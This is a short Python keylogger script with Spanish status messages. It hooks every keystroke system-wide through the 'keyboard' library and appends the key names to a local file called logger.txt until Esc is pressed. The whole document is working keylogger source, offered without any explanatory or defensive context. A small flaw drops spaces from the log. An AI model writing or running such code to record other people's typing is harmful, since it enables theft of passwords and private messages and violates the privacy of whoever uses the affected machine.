import keyboard
def on_key(event):
    with open('logger.txt', 'a') as file:
        if event.name == 'space':
            file.write('')
        else:
            file.write(event.name)
print("Keylogger iniciado. Presiona 'Esc' para detener.")
keyboard.hook(on_key)
keyboard.wait('esc')
print("Keylogger detenido.")
